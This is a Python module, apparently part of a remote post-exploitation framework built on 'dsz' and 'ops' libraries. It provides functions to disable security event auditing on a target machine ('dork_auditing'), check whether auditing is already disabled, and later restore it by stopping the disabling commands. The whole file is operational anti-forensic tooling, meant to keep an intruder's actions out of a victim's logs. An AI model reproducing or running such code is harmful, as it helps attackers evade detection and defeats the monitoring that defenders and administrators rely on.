
import dsz
import dsz.cmd
import dsz.script
import ops
import ops.cmd
import ops.db
import ops.project
from datetime import timedelta, datetime
AUDIT_TAG = 'OPS_AUDITING_STATUS'
DORKING_TAG = 'OPS_AUDITING_DORKED'
MAX_CACHE_SIZE = 3

def get_status(maxage=timedelta(0), targetID=None):
    status_cmd = ops.cmd.getDszCommand('audit -status')
    return ops.project.generic_cache_get(status_cmd, cache_tag=AUDIT_TAG, cache_size=MAX_CACHE_SIZE, maxage=maxage, targetID=targetID)

def is_dorked(targetID=None):
    if (targetID is None):
        targetID = ops.project.getTargetID()
    target_addrs = ops.project.getCPAddresses(targetID)
    return (len(ops.cmd.get_filtered_command_list(cpaddrs=target_addrs, isrunning=True, goodwords=['audit', '-disable'])) > 0)

def dork_auditing(dork_types=[], targetID=None):
    if (targetID is None):
        targetID = ops.project.getTargetID()
    if is_dorked(targetID):
        return
    results = []
    for dork_type in dork_types:
        dork_cmd = ops.cmd.getDszCommand(('audit -disable %s' % dork_type))
        dork_cmd.dszdst = ops.project.selectBestCPAddress(targetID)
        dork_result = dork_cmd.execute()
        results.append(dork_result)
        if dork_result.commandmetadata.isrunning:
            return (results, ('%s auditing disabled' % dork_type))
    return (results, 'All attempts to dork auditing failed')

def undork_auditing(targetID=None):
    if (targetID is None):
        targetID = ops.project.getTargetID()
    if (not is_dorked(targetID)):
        return
    results = []
    for cpaddr in ops.project.getCPAddresses(targetID):
        channels_command = ops.cmd.getDszCommand('commands')
        channels_command.dszdst = cpaddr
        current = channels_command.execute()
        for running_channel in current.command:
            if ((running_channel.fullcommand.find('audit') > (-1)) and (running_channel.fullcommand.find('-disable') > (-1))):
                stop_cmd = ops.cmd.getDszCommand(('stop %d' % running_channel.id))
                stop_result = stop_cmd.execute()
                if (stop_result.commandmetadata.status == 0):
                    results.append(stop_result)
                else:
                    results.append(stop_result)
    all_good = True
    for result in results:
        if (result.commandmetadata.status != 0):
            all_good = False
    if all_good:
        return (results, 'Stopped all auditing commands')
    else:
        return (results, 'Could not stop all auditing commands.  You should probably investigate.')